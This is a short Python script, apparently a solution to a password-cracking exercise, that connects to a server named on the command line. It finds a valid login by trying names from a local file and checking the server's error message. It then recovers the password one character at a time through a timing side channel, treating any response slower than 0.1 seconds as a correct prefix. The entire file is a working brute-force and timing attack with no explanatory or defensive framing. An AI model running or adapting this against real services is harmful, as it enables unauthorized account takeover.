import sys
import socket
import json
import time

with socket.socket() as sock:
    sock.connect((sys.argv[1], int(sys.argv[2])))

    with open("D:\\data\\logins.txt") as logins:
        for login in map(lambda l: l[:-1], logins):
            sock.send(json.dumps({"login": login, "password": ""}).encode())
            if json.loads(sock.recv(1024).decode())["result"] == "Wrong password!":
                break

    chars = list(chr(i) for i in range(ord('0'), ord('z') + 1) if chr(i).isalpha() or chr(i).isdigit())
    pass_prefix = ""
    while True:
        for next_char in chars:
            password = pass_prefix + next_char
            start = time.perf_counter()
            sock.send(json.dumps({"login": login, "password": password}).encode())
            result = json.loads(sock.recv(1024).decode())["result"]
            if time.perf_counter() - start > 0.1:
                pass_prefix = password
                continue
            if result == "Connection success!":
                print(json.dumps({"login": login, "password": password}))
                exit(0)